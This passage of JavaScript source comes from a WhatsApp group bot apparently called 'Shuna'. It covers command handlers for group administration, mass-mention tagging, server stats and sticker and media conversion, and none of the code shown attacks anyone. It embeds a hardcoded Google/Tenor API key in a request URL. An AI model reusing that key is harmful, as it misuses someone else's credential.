                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!quoted) return replygcxeon(`𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝒊𝒎𝒂𝒈𝒆 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 𝒃𝒂𝒃𝒆☺️ ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝒊𝒎𝒂𝒈𝒆 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 𝒃𝒂𝒃𝒆☺️ ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝒊𝒎𝒂𝒈𝒆 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 𝒃𝒂𝒃𝒆☺️ ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replygcxeon(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replygcxeon(mess.botAdmin)
                let teks = `*╚»☻••✿︎❤︎𝐓𝐀𝐆𝐀𝐋𝐋 𝐁𝐘 𝐒𝐇𝐔𝐍𝐀❤︎✿︎••☻«╝*
                 ☺️🍭 *𝐌𝐞𝐬𝐬𝐚𝐠𝐞 : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `💞 @${mem.id.split('@')[0]}\n`
                }
                XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replygcxeon(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replygcxeon(mess.botAdmin)
                XeonBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'shunatag':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins && !isCreator && !isPremium) return replygcxeon(mess.botAdmin)
                if (!isAdmins && !isCreator && !isPremium) return replygcxeon(mess.admin)
                if (!m.quoted) return replygcxeon(`𝑹𝒆𝒑𝒍𝒚 𝒎𝒆𝒔𝒔𝒂𝒈𝒆 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 𝒃𝒂𝒃𝒆 ${prefix + command}`)
                XeonBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxeon(`𝑮𝒓𝒐𝒖𝒑 𝒄𝒍𝒐𝒔𝒆𝒅 𝒘𝒊𝒕𝒉 𝒔𝒖𝒄𝒄𝒆𝒔𝒔 𝒎𝒂𝒔𝒕𝒆𝒓🍭`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`𝑮𝒓𝒐𝒖𝒑 𝒐𝒑𝒆𝒏 𝒘𝒊𝒕𝒉 𝒔𝒖𝒄𝒄𝒆𝒔𝒔 𝒎𝒂𝒔𝒕𝒆𝒓🍭`)).catch((err) => replygcxeon(json(err)))
                } else {
                    replygcxeon(`𝑴𝒐𝒅𝒆 ${command}\n\n\n𝑻𝒚𝒑𝒆 ${prefix + command}𝒐𝒑𝒆𝒏/𝒄𝒍𝒐𝒔𝒆 𝒔𝒂𝒎𝒂😇`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`𝑮𝒓𝒐𝒖𝒑 𝒆𝒅𝒊𝒕 𝒊𝒏𝒇𝒐 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒐𝒑𝒆𝒏𝒆𝒅 ☺️
                    > 𝒑𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚 𝒍𝒊𝒎𝒖𝒍𝒆 𝒔𝒐𝒍𝒊𝒕𝒂𝒓𝒖𝒔`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`𝑮𝒓𝒐𝒖𝒑 𝒆𝒅𝒊𝒕 𝒊𝒏𝒇𝒐 𝒄𝒍𝒐𝒔𝒆𝒅 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒃𝒚 𝒔𝒉𝒖𝒏𝒂☺️ 
                    > 𝒑𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚 𝒍𝒊𝒎𝒖𝒍𝒆 𝒔𝒐𝒍𝒊𝒕𝒂𝒓𝒖𝒔`)).catch((err) => replygcxeon(json(err)))
                } else {
                    replygcxeon(`𝑴𝒐𝒅𝒆 ${command}\n\n\n𝑻𝒚𝒑𝒆 ${prefix + command}𝒐𝒏/𝒐𝒇𝒇 𝒔𝒂𝒎𝒂🍭`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `👥 *𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐍𝐊 𝐈𝐍𝐅𝐎*\n📛 *𝐍𝐚𝐦𝐞 :* ${groupMetadata.subject}\n👤 *𝐆𝐫𝐨𝐮𝐩 𝐨𝐰𝐧𝐞𝐫 :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *𝐈𝐃 :* ${groupMetadata.id}\n🔗 *𝐂𝐡𝐚𝐭 𝐋𝐢𝐧𝐤 :* https://chat.whatsapp.com/${response}\n👥 *𝐌𝐞𝐦𝐛𝐞𝐫 :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                await XeonBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcxeon(`𝑺𝒉𝒖𝒏𝒂 𝒉𝒂𝒔 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒓𝒆𝒗𝒐𝒌𝒆 𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌💞 ${groupMetadata.subject}`)
                    }).catch((err) => replygcxeon(json(err)))
                break
                case 'p':
            case 'ping':{
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await XeonBotInc.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: 'https://iili.io/dP0QCDg.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `𝑯𝒊 ${pushname}👋\n𝑾𝒂𝒏𝒕 𝒕𝒐 𝒃𝒖𝒚 𝒔𝒉𝒖𝒏𝒂 𝒑𝒓𝒆𝒎𝒊𝒖𝒎? 𝒋𝒖𝒔𝒕 𝒄𝒉𝒂𝒕 with 𝑳𝒊𝒎𝒖𝒍𝒆 𝒐𝒓 𝒐𝒘𝒏𝒆𝒓 𝒃𝒂𝒃𝒆😉`
                await XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://iili.io/dP0QBOF.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `𝑺𝒉𝒖𝒏𝒂 𝒉𝒂𝒗𝒆 𝒃𝒆𝒆𝒏 𝒓𝒖𝒏𝒏𝒊𝒏𝒈 𝒇𝒐𝒓 ${runtime(process.uptime())}`
                XeonBotInc.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `𝑭𝑶𝑹𝑮𝑬𝑻 𝑫𝑶𝑵𝑨𝑻𝑬 𝑩𝑨𝑩𝑬🍭`,
                            thumbnailUrl: 'https://iili.io/dP0QCDg.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptshuna':
                XeonBotInc.sendMessage(m.chat, {
                    text: `╭═══════════════⊷
┃✿︎┃𝑺𝑯𝑼𝑵𝑨 𝑺𝑪𝑹𝑰𝑷𝑻❤️
╰═══════════════⊷
╭═══════════════⊷
┃Github: https://github.com/Limule3650/Shuna_bug-bot

╰═══════════════⊷
╭═══════════════⊷
┃ WaGroup ☘︎ https://chat.whatsapp.com/Bph2Nt7qdqf1p1pQmkIy9U

╰═══════════════⊷
╭═══════════════⊷
┃ WHATSAPP CHANNEL ➪https://whatsapp.com/channel/0029Vafhjw0IXnlonRAQMM2l

╰═══════════════⊷
╭═══════════════⊷
┃𝙵𝙾𝙻𝙻𝙾𝚆 𝙼𝚈 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝙿𝙻𝙴𝙰𝚂𝙴
┃𝐖𝐚𝐧𝐭 𝐜𝐡𝐚𝐭 𝐰𝐢𝐭𝐡 𝐦𝐞? ☞︎︎︎ https://Wa.me//+237698581946 ☜︎︎︎
╰═══════════════⊷
©2025 *𝙻𝙸𝙼𝚄𝙻𝙴 𝚂𝙾𝙻𝙸𝚃𝙰𝚁𝚄𝚂*`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `𝑯𝒆𝒓𝒆 𝒊𝒔 𝒕𝒉𝒆 𝒔𝒄𝒓𝒊𝒑𝒕 𝒐𝒇 𝒔𝒉𝒖𝒏𝒂😍`,
                            thumbnailUrl: 'https://iili.io/dP0sxmg.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'donasi':
                let textnate = `𝑯𝒆𝒍𝒍𝒐 𝒃𝒂𝒃𝒆 ${pushname}\n\n𝑵𝒐 𝒎𝒂𝒕𝒕𝒆𝒓 𝒘𝒉𝒐 𝒎𝒖𝒄𝒉 𝒚𝒐𝒖 𝒈𝒊𝒗𝒆 𝒊𝒕𝒔 𝒂 𝒑𝒍𝒆𝒂𝒔𝒖𝒓𝒆 𝒂𝒏𝒅 𝒉𝒆𝒍𝒑 𝒇𝒐𝒓 𝒖𝒔☺️`
                XeonBotInc.sendMessage(m.chat, {
                    text: 'Paypal: https://www.paypal.me/josephxeon13\n\n' + textnate
                }, {
                    quoted: m
                })
                break
case 'owner': {
const repf = await XeonBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
XeonBotInc.sendMessage(from, { text : `𝑯𝒊 @${sender.split("@")[0]}, 𝑯𝒆𝒓𝒆 𝒊𝒔 𝒔𝒉𝒖𝒏𝒂 𝒐𝒘𝒏𝒆𝒓😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replygcxeon(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replygcxeon(`𝑺𝒆𝒏𝒅 𝒊𝒎𝒂𝒈𝒆𝒔/𝒗𝒊𝒅𝒆𝒐𝒔 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 ${prefix + command}\n𝑽𝒊𝒅𝒆𝒐 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏 1-9 𝒔𝒆𝒄𝒐𝒏𝒅𝒔🍭`)
                }
            }
            break
            case 'smeme': {
                let respond = `𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝒊𝒎𝒂𝒈𝒆/𝒗𝒊𝒅𝒆𝒐 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 ${prefix + command} 𝒕𝒆𝒙𝒕1|𝒕𝒆𝒙𝒕2`
                if (!/image/.test(mime)) return replygcxeon(respond)
                if (!text) return replygcxeon(respond)
                replygcxeon(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await XeonBotInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcxeon(`𝒃𝒂𝒃𝒆 𝒘𝒉𝒆𝒓𝒆 𝒊𝒔 𝒕𝒉𝒆 𝒕𝒆𝒙𝒕?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcxeon(`𝑹𝒆𝒑𝒍𝒚 𝒕𝒐 𝒔𝒕𝒊𝒄𝒌𝒆𝒓 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    XeonBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcxeon(`𝑹𝒆𝒑𝒍𝒚 𝒕𝒐 𝒔𝒕𝒊𝒄𝒌𝒆𝒓 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝒊𝒎𝒂𝒈𝒆/𝒗𝒊𝒅𝒆𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒄𝒐𝒏𝒗𝒆𝒓𝒕 𝒕𝒐 𝒂𝒖𝒅𝒊𝒐 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 𝒃𝒂𝒃𝒆🍭 ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝒊𝒎𝒂𝒈𝒆/𝒗𝒊𝒅𝒆𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒄𝒐𝒏𝒗𝒆𝒓𝒕 𝒕𝒐 𝑴𝒑3 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 𝒃𝒂𝒃𝒆🍭 ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `limule.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`𝑺𝒆𝒏𝒅/𝑹𝒆𝒑𝒍𝒚 𝒊𝒎𝒂𝒈𝒆/𝒗𝒊𝒅𝒆𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒄𝒐𝒏𝒗𝒆𝒓𝒕 𝒕𝒐 𝑽𝑵 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 𝒃𝒂𝒃𝒆🍭 ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcxeon(`𝑹𝒆𝒑𝒍𝒚 𝒔𝒕𝒊𝒄𝒌𝒆𝒓 𝒘𝒊𝒕𝒉 𝒄𝒂𝒑𝒕𝒊𝒐𝒏 *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcxeon(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcxeon(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : ${prefix + command} 😅+🤔`)
                replygcxeon(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'tovo':
            case 'toviewonce': {
                if (!quoted) return replygcxeon(`𝑹𝒆𝒑𝒍𝒚 𝒊𝒎𝒂𝒈𝒆/𝒗𝒊𝒅𝒆𝒐 𝒃𝒂𝒃𝒆☺️`)
                if (/image/.test(mime)) {
                    anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `𝑯𝒆𝒓𝒆 𝒚𝒐𝒖 𝒈𝒐!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `𝑯𝒆𝒓𝒆 𝒚𝒐𝒖 𝒈𝒐!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replygcxeon('𝑷𝒍𝒆𝒂𝒔𝒆 𝒃𝒂𝒃𝒆 𝒊𝒏𝒄𝒍𝒖𝒅𝒆 𝒍𝒊𝒏𝒌 𝒐𝒓 𝒕𝒆𝒙𝒕!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await XeonBotInc.sendMessage(from, {
                    image: medi,
                    caption: "𝑯𝒆𝒓𝒆 𝒚𝒐𝒖 𝒈𝒐!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆:\n${prefix}𝒇𝒍𝒊𝒑𝒕𝒆𝒙𝒕 𝑳𝒊𝒎𝒖𝒍𝒆`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcxeon(`\`\`\`「 𝐅𝐋𝐈𝐏 𝐓𝐄𝐗𝐓 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *𝐋𝐢𝐬𝐭 𝐯𝐧* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *𝐋𝐢𝐬𝐭 𝐒𝐭𝐢𝐜𝐤𝐞𝐫* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *𝐋𝐢𝐬𝐭 𝐈𝐦𝐚𝐠𝐞* 」\n│\n'
                for (let x of ImageXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *𝐋𝐢𝐬𝐭 𝐕𝐢𝐝𝐞𝐨* 」\n│\n'
                for (let x of VideoXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒏𝒖𝒎𝒃𝒆𝒓\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await XeonBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcxeon(`𝑫𝒂𝒓𝒍𝒊𝒏𝒈🍭 𝒆𝒏𝒕𝒆𝒓 𝒆𝒕 𝒗𝒂𝒍𝒊𝒅 𝒂𝒏𝒅 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒏𝒖𝒎𝒃𝒆𝒓 𝒐𝒏 𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑!!!`)
